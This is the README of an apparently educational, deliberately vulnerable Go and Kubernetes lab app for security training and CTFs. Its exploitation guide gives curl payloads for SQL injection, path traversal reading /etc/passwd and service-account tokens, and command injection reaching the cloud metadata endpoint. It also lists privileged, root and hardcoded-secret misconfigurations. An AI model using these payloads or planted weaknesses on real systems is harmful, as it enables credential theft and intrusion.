# Vulnerable K8s Go App 🚀
**Maintained by [peachycloudsecurity.com](https://peachycloudsecurity.com)**

This is a "Vulnerable by Design" Go application built to demonstrate **OWASP Kubernetes Top 10 (2025)** risks and common web vulnerabilities. It is intended for security research, CTFs, and DevSecOps training.

---

## 🛠 Features
* **Built-in Logging:** Real-time tracking of Method, Path, Timestamp, and Remote IP.
* **Index Page:** Custom landing page at `/` for branding and navigation.
* **Lightweight:** Pure Go implementation (no CGO/SQLite dependencies) for easy portability.
* **K8s Focused:** Specifically crafted to test Pod escapes and Lateral Movement.

---

## 🚀 Quick Start

### 1. Run with Docker
```bash
docker pull peachycloudsecurity/vulnerable-go-app:latest
docker run -p 8080:8080 peachycloudsecurity/vulnerable-go-app:latest
```

### 2. Run Locally
```bash
cd webapp
go run main.go
```

---

## 🛡️ Vulnerability Lab (Exploitation Guide)

### 1. SQL Injection (UNION-based)
**Endpoint:** `/db?id=`
The application simulates a backend database vulnerable to string concatenation.

* **Baseline:** `curl "http://localhost:8080/db?id=1"` (Normal response)
* **Probing:** `curl "http://localhost:8080/db?id=1'"` (Behavior check)
* **Exploit:** `curl "http://localhost:8080/db?id=1+OR+1=1"` (Logic bypass)
* **Exfiltration:** `curl "http://localhost:8080/db?id=1+UNION+SELECT+secret+FROM+users"` (Extracts Flag)

### 2. Path Traversal (K01: Insecure Workload Config)
**Endpoint:** `/config?source=`
Simulates stealing Kubernetes Service Account tokens or sensitive system files.

* **Exploit:** `curl "http://localhost:8080/config?source=/etc/passwd"`
* **K8s Attack:** `curl "http://localhost:8080/config?source=/var/run/secrets/kubernetes.io/serviceaccount/token"`

### 3. Command Injection (K08: Lateral Movement)
**Endpoint:** `/exec?run=`
Simulates a compromised container allowing an attacker to reach the Cloud Metadata Service (IMDS).

* **Exploit:** `curl "http://localhost:8080/exec?run=whoami;id;ls"`
* **Lateral Movement:** `curl "http://localhost:8080/exec?run=curl+s+http://169.254.169.254/latest/meta-data/"`

---

## 🚢 Kubernetes Deployment
Deploy using the provided manifests to test **Privileged** container escapes:

```bash
kubectl apply -f manifests/deployment.yaml
```

**Vulnerabilities included in K8s Manifest:**
* **K01:** Running as `root` and `privileged: true`.
* **K03:** Hardcoded secrets in code.
* **K06:** Exposed via LoadBalancer/NodePort.

---

### GNU General Public License v3.0
This project is licensed under the **GPL-3.0 License**. You are free to copy, modify, and distribute this software, provided that all derivative works remain under the same license. See the \`LICENSE\` file for the full text.

### ⚠️ Disclaimer
**FOR EDUCATIONAL PURPOSES ONLY.** Using this tool against target systems without explicit prior permission is illegal. **peachycloudsecurity** and its contributors are not responsible for any misuse, damage, or legal consequences caused by this software. Use it only in controlled lab environments.


1. **Vulnerable by Design:** This application is intentionally insecure. **DO NOT** deploy this in a production environment or any network containing sensitive data.
2. **No Guarantees:** This software is provided "as is" without any warranty of any kind, express or implied. Use it at your own risk.
3. **No Liability:** Under no circumstances shall the author, the maintainer (peachycloudsecurity.com), or any past/present employers and employees be held liable for any direct, indirect, or consequential damages arising from the use or misuse of this software.
4. **Legal Compliance:** Using this tool against target systems without explicit prior permission is illegal. It is the user's responsibility to comply with all applicable local, state, and federal laws.

---

## Peachycloud Security

Hands-On Multi-Cloud & Cloud-Native Security Education

Created by The Shukla Duo (Anjali & Divyanshu), this tool is part of our mission to make cloud security accessible through practical, hands-on learning. We specialize in AWS, GCP, Kubernetes security, and DevSecOps practices.

### Learn & Grow

Explore our educational content and training programs:

[YouTube Channel](https://www.youtube.com/@peachycloudsecurity) | [Website](https://peachycloudsecurity.com) | [1:1 Consultations](https://topmate.io/peachycloudsecurity)

Learn cloud security through hands-on labs, real-world scenarios, and practical tutorials covering GCP & AWS, GKE & EKS, Kubernetes, Containers, DevSecOps, and Threat Modeling.

### Support Our Work

If this tool helps you secure your infrastructure, consider supporting our educational mission:

[Sponsor on GitHub](https://github.com/sponsors/peachycloudsecurity)

Your support helps us create more free educational content and security tools for the community.

